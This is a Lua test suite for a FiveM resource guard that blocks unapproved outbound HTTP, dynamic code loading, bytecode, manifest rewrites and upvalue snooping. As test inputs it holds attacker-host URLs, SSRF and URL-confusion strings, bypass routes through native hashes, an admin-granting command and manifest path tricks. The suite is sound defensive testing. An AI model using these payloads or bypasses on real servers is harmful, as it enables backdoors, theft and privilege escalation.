-- Load guard.lua under the chunk name FXServer gives it ('@@torii/src/guard.lua') so that the
-- "protected source" rules apply to torii's own functions exactly as they do in the game.
local function load_as_torii(name)
	local file = assert(io.open('torii/src/' .. name .. '.lua', 'rb'))
	local source = file:read('a')
	file:close()
	return assert(load(source, '@@torii/src/' .. name .. '.lua', 't'))()
end
local guard = load_as_torii('guard')
local policy = require('policy')

local TOKEN = 'abcdefghijklmnopqrstuvwxyz0123456789'

--- Builds a fake FiveM Lua state: natives that record their calls, a fake `debug` table and a report sink.
local function make_env(opts)
	opts = opts or {}
	local state = { mode = opts.mode or 'enforce', calls = {}, events = {}, clock = 0, files = opts.files or {} }

	local function record(name, ...)
		state.calls[#state.calls + 1] = { name = name, args = table.pack(...) }
	end

	local G = {
		PerformHttpRequestInternalEx = function(request)
			record('http_ex', request)
			return 7
		end,
		PerformHttpRequestInternal = function(payload, length)
			record('http_json', payload, length)
			return 8
		end,
		ExecuteCommand = function(command)
			record('execute_command', command)
		end,
		GetConvar = function(name)
			record('get_convar', name)
			return 'SECRET-VALUE'
		end,
		SetHttpHandler = function(handler)
			record('set_http_handler', handler)
		end,
		SaveResourceFile = function(resource, file, data, length)
			record('save_resource_file', resource, file)
			if type(data) == 'string' then
				state.files[resource .. '/' .. file] = type(length) == 'number' and data:sub(1, length) or data
			end
			return true
		end,
		LoadResourceFile = function(resource, file)
			return state.files[resource .. '/' .. file]
		end,
		Citizen = {
			InvokeNative = function(hash, ...)
				record('invoke_native', hash, ...)
				return 'native-result'
			end,
			LoadNative = function(name)
				record('load_native', name)
				return nil
			end,
		},
	}

	local fake_debug = { getinfo = debug.getinfo, getupvalue = debug.getupvalue }

	-- Tiny stand-ins for json / msgpack: the payload string is a key into a table.
	local decoded = {}
	local env = {
		G = G,
		resource = 'res',
		policy = policy.new({
			version = 1,
			resources = {
				res = {
					http = { 'api.example.com/v1', 'discord.com/api/webhooks/123' },
					dynamic_code = opts.dynamic_code == true or (opts.dynamic_code == 'files' and 'files') or false,
					follow_redirects = opts.follow_redirects == true,
				},
			},
		}),
		debug = fake_debug,
		orig_load = load,
		mode = function()
			return state.mode
		end,
		now = function()
			return state.clock
		end,
		report = opts.report or function(event)
			state.events[#state.events + 1] = event
		end,
		json_decode = function(text)
			return decoded[text]
		end,
		json_encode = function(value)
			local key = 'encoded-' .. tostring(value.url)
			decoded[key] = value
			return key
		end,
		msgpack_unpack = function(text)
			return decoded[text]
		end,
		msgpack_pack = function(value)
			local key = 'packed-' .. tostring(value.url)
			decoded[key] = value
			return key
		end,
	}
	state.decoded = decoded
	state.G = G
	state.env = env
	state.debug = fake_debug
	state.original_load = load
	state.install = function()
		local result = guard.install(env)
		assert.are.same({}, result.failures)
		return result
	end
	state.last_call = function()
		return state.calls[#state.calls]
	end
	return state
end

describe('guard: HTTP via the named native (what PerformHttpRequest ends up calling)', function()
	it('blocks a request to an unknown host in enforce mode and looks like a network failure (-1)', function()
		local s = make_env()
		s.install()
		local id = s.G.PerformHttpRequestInternalEx({ url = 'https://cipher-panel.example/payload', method = 'GET' })
		assert.are.equal(-1, id)
		assert.are.equal(0, #s.calls)
		assert.are.equal(1, #s.events)
		assert.are.equal('deny', s.events[1].decision)
		assert.are.equal('not_in_allow_list', s.events[1].reason)
		assert.are.equal('https://cipher-panel.example/payload', s.events[1].target)
		assert.are.equal('res', s.events[1].resource)
	end)

	it('only logs in observe mode and lets the request through unchanged', function()
		local s = make_env({ mode = 'observe' })
		s.install()
		local id =
			s.G.PerformHttpRequestInternalEx({ url = 'https://cipher-panel.example/payload', followLocation = true })
		assert.are.equal(7, id)
		assert.are.equal('would_deny', s.events[1].decision)
		assert.is_true(s.last_call().args[1].followLocation)
	end)

	it('lets an allowed request through and disables redirects in enforce mode', function()
		local s = make_env()
		s.install()
		local id = s.G.PerformHttpRequestInternalEx({ url = 'https://api.example.com/v1/users', followLocation = true })
		assert.are.equal(7, id)
		assert.is_false(s.last_call().args[1].followLocation)
		assert.are.equal(0, #s.events)
	end)

	it('keeps redirects when the lockfile grants follow_redirects', function()
		local s = make_env({ follow_redirects = true })
		s.install()
		s.G.PerformHttpRequestInternalEx({ url = 'https://api.example.com/v1/users', followLocation = true })
		assert.is_true(s.last_call().args[1].followLocation)
	end)

	it('allows the Discord webhook of the lockfile and nothing else on discord.com', function()
		local s = make_env()
		s.install()
		assert.are.equal(
			7,
			s.G.PerformHttpRequestInternalEx({ url = 'https://discord.com/api/webhooks/123/' .. TOKEN })
		)
		assert.are.equal(
			-1,
			s.G.PerformHttpRequestInternalEx({ url = 'https://discord.com/api/webhooks/999/' .. TOKEN })
		)
		assert.are.equal('https://discord.com/api/webhooks/999/<redacted>', s.events[1].target)
		assert.is_nil(s.events[1].target:find(TOKEN, 1, true))
	end)

	it('blocks localhost, private ranges and tricky urls', function()
		local s = make_env()
		s.install()
		for _, raw in ipairs({
			'http://127.0.0.1:30120/',
			'http://localhost/',
			'http://169.254.169.254/latest/meta-data',
			'https://api.example.com@evil.example/v1',
			'https://api.example.com.evil.example/v1',
			'http://2130706433/',
		}) do
			assert.are.equal(-1, s.G.PerformHttpRequestInternalEx({ url = raw }), raw)
		end
		assert.are.equal(0, #s.calls)
	end)

	it('copies the request so a table with metamethods cannot answer differently to the native', function()
		local s = make_env()
		s.install()
		local reads = 0
		local sneaky = setmetatable({}, {
			__index = function(_, key)
				if key == 'url' then
					reads = reads + 1
					return reads == 1 and 'https://api.example.com/v1/x' or 'https://evil.example/'
				end
			end,
		})
		local id = s.G.PerformHttpRequestInternalEx(sneaky)
		-- rawget finds no 'url' field, so the request is refused instead of being checked once and sent twice
		assert.are.equal(-1, id)
		assert.are.equal(0, #s.calls)
	end)

	it('never reports the body, headers or query string', function()
		local s = make_env({ mode = 'observe' })
		s.install()
		s.G.PerformHttpRequestInternalEx({
			url = 'https://evil.example/collect?key=QUERYSECRET',
			data = 'BODYSECRET',
			headers = { Authorization = 'HEADERSECRET' },
		})
		local dump = require('spec_dump')(s.events)
		assert.is_nil(dump:find('QUERYSECRET', 1, true))
		assert.is_nil(dump:find('BODYSECRET', 1, true))
		assert.is_nil(dump:find('HEADERSECRET', 1, true))
	end)

	it('fails closed in enforce mode and open in observe mode when the policy itself breaks', function()
		local enforce = make_env()
		enforce.env.policy.check_http = function()
			error('boom')
		end
		enforce.install()
		assert.are.equal(-1, enforce.G.PerformHttpRequestInternalEx({ url = 'https://api.example.com/v1/x' }))
		assert.are.equal('internal_error', enforce.events[1].reason)

		local observe = make_env({ mode = 'observe' })
		observe.env.policy.check_http = function()
			error('boom')
		end
		observe.install()
		assert.are.equal(7, observe.G.PerformHttpRequestInternalEx({ url = 'https://api.example.com/v1/x' }))
	end)

	it('does not crash the resource when reporting fails', function()
		local s = make_env({
			report = function()
				error('log disk full')
			end,
		})
		s.install()
		assert.are.equal(-1, s.G.PerformHttpRequestInternalEx({ url = 'https://evil.example/' }))
	end)

	it('collapses identical events and reports again after the window', function()
		local s = make_env({ mode = 'observe' })
		s.install()
		for _ = 1, 5 do
			s.G.PerformHttpRequestInternalEx({ url = 'https://evil.example/x' })
		end
		assert.are.equal(1, #s.events)
		s.clock = 31000
		s.G.PerformHttpRequestInternalEx({ url = 'https://evil.example/x' })
		assert.are.equal(2, #s.events)
	end)

	it('records the call site in resource code, not in torii or system scripts', function()
		local s = make_env()
		s.install()
		s.G.PerformHttpRequestInternalEx({ url = 'https://evil.example/' })
		assert.is_truthy(s.events[1].src:match('guard_spec%.lua:%d+$'))
	end)
end)

describe('guard: HTTP via the JSON native', function()
	it('blocks and rewrites followLocation', function()
		local s = make_env()
		s.state = s
		s.decoded = s.decoded
		s.install()
		s.decoded['evil'] = { url = 'https://evil.example/' }
		s.decoded['ok'] = { url = 'https://api.example.com/v1/a', followLocation = true }
		assert.are.equal(-1, s.G.PerformHttpRequestInternal('evil', 4))
		assert.are.equal(8, s.G.PerformHttpRequestInternal('ok', 2))
		local call = s.last_call()
		assert.are.equal('encoded-https://api.example.com/v1/a', call.args[1])
		assert.is_false(s.decoded[call.args[1]].followLocation)
	end)

	it('refuses undecodable payloads in enforce mode', function()
		local s = make_env()
		s.install()
		assert.are.equal(-1, s.G.PerformHttpRequestInternal('not-in-table', 3))
	end)
end)

describe('guard: Citizen.InvokeNative (the usual way around name-based hooks)', function()
	it('applies the same HTTP policy to the HTTP native hash, whatever the number spelling', function()
		local s = make_env()
		s.install()
		s.decoded['evil'] = { url = 'https://evil.example/' }
		for _, hash in ipairs({ 0x6b171e87, 0x6b171e87 + 0.0, '0x6b171e87', ' 0x6B171E87 ', tostring(0x6b171e87) }) do
			assert.are.equal(-1, s.G.Citizen.InvokeNative(hash, 'evil', 4, 'marker'), tostring(hash))
		end
		assert.are.equal(0, #s.calls)
	end)

	it('also covers the JSON variant and forwards allowed calls with redirects disabled', function()
		local s = make_env()
		s.install()
		s.decoded['evil'] = { url = 'https://evil.example/' }
		s.decoded['ok'] = { url = 'https://api.example.com/v1/a', followLocation = true }
		assert.are.equal(-1, s.G.Citizen.InvokeNative(0x8e8cc653, 'evil', 4))
		assert.are.equal('native-result', s.G.Citizen.InvokeNative(0x6b171e87, 'ok', 2, 'result-marker'))
		local call = s.last_call()
		assert.are.equal('invoke_native', call.name)
		assert.are.equal('packed-https://api.example.com/v1/a', call.args[2])
		assert.are.equal('result-marker', call.args[4])
		assert.is_false(s.decoded[call.args[2]].followLocation)
	end)

	it('passes unrelated natives straight through', function()
		local s = make_env()
		s.install()
		assert.are.equal('native-result', s.G.Citizen.InvokeNative(0x12345678, 'a', 'b'))
		assert.are.equal(0, #s.events)
		assert.are.same({ 0x12345678, 'a', 'b', n = 3 }, s.last_call().args)
	end)

	it('logs direct calls to other sensitive natives', function()
		local s = make_env()
		s.install()
		s.G.Citizen.InvokeNative(0x561c060b, 'quit now')
		assert.are.equal('native_direct', s.events[1].type)
		assert.are.equal('ExecuteCommand', s.events[1].target)
	end)

	it('hands out the wrapper, not a fresh stub, from LoadNative', function()
		local s = make_env()
		s.install()
		assert.are.equal(s.G.PerformHttpRequestInternalEx, s.G.Citizen.LoadNative('PerformHttpRequestInternalEx'))
		s.G.Citizen.LoadNative('GetPlayerName')
		assert.are.equal('load_native', s.last_call().name)
	end)
end)

describe("guard: load with torii_dynamic_code 'files'", function()
	local MODULE = 'return { answer = 42 }'

	it('allows text exactly as read from a resource file', function()
		local s = make_env({ dynamic_code = 'files', files = { ['ox_lib/imports/x.lua'] = MODULE } })
		s.install()
		local text = s.G.LoadResourceFile('ox_lib', 'imports/x.lua')
		local fn = s.G.load(text, '@@ox_lib/imports/x.lua')
		assert.are.equal(42, fn().answer)
		assert.are.equal(0, #s.events)
	end)

	it('refuses text built in memory', function()
		local s = make_env({ dynamic_code = 'files' })
		s.install()
		local fn, err = s.G.load('return 1')
		assert.is_nil(fn)
		assert.is_truthy(err:find('not permitted', 1, true))
		assert.are.equal('text_not_from_resource_files', s.events[1].reason)
	end)

	it('refuses file text once modified, even slightly', function()
		local s = make_env({ dynamic_code = 'files', files = { ['ox_lib/imports/x.lua'] = MODULE } })
		s.install()
		local text = s.G.LoadResourceFile('ox_lib', 'imports/x.lua')
		assert.is_nil(s.G.load(text .. ' '))
		assert.is_nil(s.G.load((text:gsub('42', '43'))))
	end)

	it('refuses text the resource wrote itself and read back (no laundering through a file)', function()
		local s = make_env({ dynamic_code = 'files' })
		s.install()
		s.G.SaveResourceFile('res', 'cache.lua', 'return "payload"', -1)
		local text = s.G.LoadResourceFile('res', 'cache.lua')
		assert.are.equal('return "payload"', text)
		assert.is_nil(s.G.load(text))
		assert.are.equal('text_not_from_resource_files', s.events[#s.events].reason)
	end)

	it('stops trusting file texts read after the resource writes through io.open', function()
		local s = make_env({
			dynamic_code = 'files',
			files = { ['res/before.lua'] = 'return 1', ['res/after.lua'] = 'return 2' },
		})
		local opened = {}
		s.G.io = {
			open = function(path, open_mode)
				opened[#opened + 1] = { path, open_mode }
				return 'handle'
			end,
		}
		s.install()
		local before = s.G.LoadResourceFile('res', 'before.lua')
		assert.are.equal('handle', s.G.io.open('@res/notes.txt', 'r'))
		s.G.io.open('@res/after.lua', 'w')
		s.files['res/later.lua'] = 'return 3'
		local later = s.G.LoadResourceFile('res', 'later.lua')
		assert.are.equal(1, s.G.load(before)())
		assert.is_nil(s.G.load(later))
		assert.are.same({ '@res/after.lua', 'w' }, opened[2])
	end)

	it('also catches a write truncated by its length argument', function()
		local s = make_env({ dynamic_code = 'files' })
		s.install()
		s.G.SaveResourceFile('res', 'cache.lua', 'return 7 -- padding', 8)
		local text = s.G.LoadResourceFile('res', 'cache.lua')
		assert.are.equal('return 7', text)
		assert.is_nil(s.G.load(text))
	end)

	it('refuses file text that the resource wrote after reading it', function()
		local s = make_env({ dynamic_code = 'files', files = { ['res/a.lua'] = MODULE } })
		s.install()
		local text = s.G.LoadResourceFile('res', 'a.lua')
		s.G.SaveResourceFile('res', 'b.lua', MODULE, #MODULE)
		assert.is_nil(s.G.load(text))
	end)

	it('does not remember data files (JSON), which can never be a chunk', function()
		local s = make_env({ dynamic_code = 'files', files = { ['res/data.json'] = '{"a":1}' } })
		s.install()
		local text = s.G.LoadResourceFile('res', 'data.json')
		assert.is_nil(s.G.load(text))
	end)

	it('still refuses bytecode read from a file', function()
		local s = make_env({ dynamic_code = 'files', files = { ['res/b.luac'] = string.dump(function() end) } })
		s.install()
		local fn, err = s.G.load(s.G.LoadResourceFile('res', 'b.luac'))
		assert.is_nil(fn)
		assert.is_truthy(err:find('binary', 1, true))
	end)

	it('logs but loads in observe mode', function()
		local s = make_env({ mode = 'observe', dynamic_code = 'files' })
		s.install()
		assert.are.equal(1, s.G.load('return 1')())
		assert.are.equal('would_deny', s.events[1].decision)
	end)

	it('leaves a full grant unchanged', function()
		local s = make_env({ dynamic_code = true })
		s.install()
		assert.are.equal(1, s.G.load('return 1')())
		assert.are.equal(0, #s.events)
	end)
end)

describe('guard: load', function()
	it('refuses dynamic code in enforce mode when not granted (nil + message, no error)', function()
		local s = make_env()
		s.install()
		local fn, err = s.G.load('return 1')
		assert.is_nil(fn)
		assert.is_truthy(err:find('not permitted', 1, true))
		assert.are.equal('dynamic_code', s.events[1].type)
		assert.are.equal('deny', s.events[1].decision)
	end)

	it('only logs in observe mode and still loads the chunk', function()
		local s = make_env({ mode = 'observe' })
		s.install()
		assert.are.equal(1, s.G.load('return 1')())
		assert.are.equal('would_deny', s.events[1].decision)
	end)

	it('allows text chunks for granted resources and honours the environment argument', function()
		local s = make_env({ dynamic_code = true })
		s.install()
		assert.are.equal(5, s.G.load('return x', 'chunk', 'bt', { x = 5 })())
		assert.are.equal(0, #s.events)
	end)

	it('does not pass an env when the caller did not (so the chunk keeps the real globals)', function()
		local s = make_env({ dynamic_code = true })
		s.install()
		assert.are.equal('function', s.G.load('return type')()('x') and 'function' or 'x')
	end)

	it('refuses binary chunks in every mode, even for granted resources', function()
		for _, mode in ipairs({ 'observe', 'enforce' }) do
			local s = make_env({ mode = mode, dynamic_code = true })
			s.install()
			local bytecode = string.dump(function()
				return 1
			end)
			local fn, err = s.G.load(bytecode)
			assert.is_nil(fn, mode)
			assert.is_truthy(err:find('binary', 1, true))
			assert.are.equal('bytecode', s.events[1].type)
			-- forcing the mode to "b" must not help either
			assert.is_nil(s.G.load(bytecode, 'x', 'b'))
			-- nor must a reader function
			local given = false
			local fn2 = s.G.load(function()
				if given then
					return nil
				end
				given = true
				return bytecode
			end, 'x', 'b')
			assert.is_nil(fn2)
		end
	end)

	it('works with a reader function for text chunks', function()
		local s = make_env({ dynamic_code = true })
		s.install()
		local parts = { 'return ', '41 + 1' }
		local i = 0
		local fn = s.G.load(function()
			i = i + 1
			return parts[i]
		end)
		assert.are.equal(42, fn())
	end)
end)

describe('guard: other natives', function()
	it('logs only the NAME of sensitive convars, never their value', function()
		local s = make_env()
		s.install()
		assert.are.equal('SECRET-VALUE', s.G.GetConvar('rcon_password', ''))
		assert.are.equal('SECRET-VALUE', s.G.GetConvar('sv_hostname', ''))
		assert.are.equal(1, #s.events)
		assert.are.equal('rcon_password', s.events[1].target)
		assert.is_nil(require('spec_dump')(s.events):find('SECRET-VALUE', 1, true))
	end)

	it('logs the command name but not its arguments', function()
		local s = make_env()
		s.install()
		s.G.ExecuteCommand('add_ace group.admin command allow')
		assert.are.equal('add_ace', s.events[1].target)
		assert.is_nil(require('spec_dump')(s.events):find('group.admin', 1, true))
		assert.are.equal('execute_command', s.last_call().name)
	end)

	it('notes inbound HTTP handlers', function()
		local s = make_env()
		s.install()
		s.G.SetHttpHandler(function() end)
		assert.are.equal('http_handler', s.events[1].type)
	end)

	it('refuses manifest rewrites in enforce mode, however the name is spelled', function()
		local s = make_env()
		s.install()
		for _, name in ipairs({
			'fxmanifest.lua',
			'FXMANIFEST.LUA',
			'sub/../fxmanifest.lua',
			'dir\\__resource.lua',
			'fxmanifest.lua.',
			'fxmanifest.lua ',
			'fxmanifest.lua::$DATA',
		}) do
			assert.is_false(s.G.SaveResourceFile('res', name, 'x', -1), name)
		end
		assert.are.equal(0, #s.calls)
		assert.is_true(s.G.SaveResourceFile('res', 'data/config.json', '{}', -1))
	end)

	it('only logs manifest rewrites in observe mode', function()
		local s = make_env({ mode = 'observe' })
		s.install()
		assert.is_true(s.G.SaveResourceFile('res', 'fxmanifest.lua', 'x', -1))
		assert.are.equal('would_deny', s.events[1].decision)
	end)
end)

describe('guard: debug.getupvalue', function()
	local function function_with_upvalue(chunkname)
		-- returns a function whose chunk name is `chunkname` and which captures one upvalue
		local maker = assert(load('local secret = 42; return function() return secret end', chunkname))
		return maker()
	end

	it('refuses functions from system scripts (@citizen:/...), which hold the real InvokeNative', function()
		local s = make_env()
		s.install()
		local scheduler_like = function_with_upvalue('@citizen:/scripting/lua/scheduler.lua')
		assert.are.equal('secret', debug.getupvalue(scheduler_like, 1)) -- the unpatched debug sees it
		assert.is_nil(s.debug.getupvalue(scheduler_like, 1))
		local loader_like = function_with_upvalue('@citizen:/scripting/lua/natives_loader.lua')
		assert.is_nil(s.debug.getupvalue(loader_like, 1))
	end)

	it('refuses lazily generated native stubs, whose chunk name is @Name.lua', function()
		local s = make_env()
		s.install()
		local stub_like = function_with_upvalue('@GetPlayerName.lua')
		assert.is_nil(s.debug.getupvalue(stub_like, 1))
	end)

	it('refuses torii functions themselves', function()
		local s = make_env()
		s.install()
		assert.is_nil(s.debug.getupvalue(function_with_upvalue('@@torii/src/guard.lua'), 1))
		assert.is_nil(s.debug.getupvalue(s.G.PerformHttpRequestInternalEx, 1))
		assert.is_nil(s.debug.getupvalue(s.debug.getupvalue, 1))
	end)

	it('still works for ordinary resource code', function()
		local s = make_env()
		s.install()
		local name, value = s.debug.getupvalue(function_with_upvalue('@@res/server.lua'), 1)
		assert.are.equal('secret', name)
		assert.are.equal(42, value)
		assert.are.equal('secret', select(1, s.debug.getupvalue(function_with_upvalue('=anonymous'), 1)))
	end)

	it('keeps the original behaviour for non-functions and C functions', function()
		local s = make_env()
		s.install()
		assert.is_false(pcall(s.debug.getupvalue, 42, 1))
	end)

	it('classifies sources', function()
		assert.is_true(guard.is_protected_source('@citizen:/scripting/lua/scheduler.lua'))
		assert.is_true(guard.is_protected_source('@PerformHttpRequestInternalEx.lua'))
		assert.is_true(guard.is_protected_source('@@torii/init.lua'))
		assert.is_false(guard.is_protected_source('@@ox_lib/init.lua'))
		assert.is_false(guard.is_protected_source('@@my_res/server/main.lua'))
		assert.is_false(guard.is_protected_source('=(load)'))
		assert.is_false(guard.is_protected_source(nil))
	end)
end)

describe('guard: install', function()
	it('reports missing natives instead of raising', function()
		local s = make_env()
		s.G.SetHttpHandler = nil
		local result = guard.install(s.env)
		assert.are.equal(1, #result.failures)
		assert.is_truthy(result.failures[1]:find('SetHttpHandler', 1, true))
	end)

	it('normalises native hashes like lua_tointeger', function()
		assert.are.equal(255, guard.normalize_hash(255))
		assert.are.equal(255, guard.normalize_hash(255.0))
		assert.is_nil(guard.normalize_hash(255.5))
		assert.are.equal(255, guard.normalize_hash('0xff'))
		assert.is_nil(guard.normalize_hash('zz'))
		assert.is_nil(guard.normalize_hash({}))
	end)
end)
